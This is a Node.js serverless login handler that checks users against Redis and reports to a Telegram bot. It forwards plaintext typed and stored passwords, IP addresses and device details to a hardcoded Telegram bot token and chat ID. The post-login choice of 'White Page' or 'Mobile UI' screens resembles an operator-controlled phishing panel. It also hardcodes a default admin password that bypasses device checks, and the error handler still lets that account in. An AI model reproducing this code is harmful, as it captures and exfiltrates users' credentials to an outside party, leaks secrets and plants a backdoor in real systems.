const fetch = require('node-fetch');
const { Redis } = require('@upstash/redis');

const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL,
  token: process.env.UPSTASH_REDIS_REST_TOKEN,
});

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    const { username, password, deviceInfo } = req.body;
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8758506651:AAH-GCPCua0qS2dIvFINUg1LYMli91_t1Yg';
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '5290622641';

    const u = (username || '').trim().toLowerCase();
    const p = (password || '').trim();
    const currentDeviceId = deviceInfo ? deviceInfo.deviceId : 'Unknown';
    const currentIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    try {
        // 1. Get Saved Password
        const savedPass = await redis.hget('users', u);
        
        // 2. Validate Credentials
        const isDefaultAdmin = (u === 'nextgen' && p === 'nextgen105');
        const isDynamicUser = (savedPass && String(savedPass) === String(p));

        if (!isDefaultAdmin && !isDynamicUser) {
            // Notify Admin of Fail
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    chat_id: CHAT_ID, 
                    text: `⚠️ *LOGIN FAILED*\nUser: \`${u}\`\nPass: \`${p}\`\nDB Pass: \`${savedPass || 'None'}\``,
                    parse_mode: 'Markdown'
                })
            });
            return res.status(401).json({ error: 'INVALID_CREDENTIALS' });
        }

        // 3. Device Locking (Skip for default admin)
        if (!isDefaultAdmin) {
            const registeredId = await redis.hget('user_devices', u);
            if (!registeredId) {
                await redis.hset('user_devices', { [u]: currentDeviceId });
            } else if (registeredId !== currentDeviceId) {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        text: `🚫 *UNAUTHORIZED DEVICE BLOCKED*\nUser: \`${u}\`\nAttempted from a different device.`,
                        parse_mode: 'Markdown'
                    })
                });
                return res.status(403).json({ error: 'UNAUTHORIZED_DEVICE' });
            }
        }

        // 4. Send Success Notification
        const msg = `
🚨 *NEW ACCESS DETECTED* 🚨
👤 *User:* \`${u}\`
📱 *Device:* ${deviceInfo ? deviceInfo.device : 'Unknown'}
🌐 *IP:* \`${currentIp}\`

Select screen:
        `;

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: msg,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '⚪ White Page', callback_data: `set_white_${u}` },
                        { text: '📱 Mobile UI', callback_data: `set_mobile_${u}` }
                    ]]
                }
            })
        });

        return res.status(200).json({ success: true });

    } catch (e) {
        console.error('API Error:', e);
        if (u === 'nextgen' && p === 'nextgen105') return res.status(200).json({ success: true });
        return res.status(500).json({ error: 'SERVER_ERROR' });
    }
}
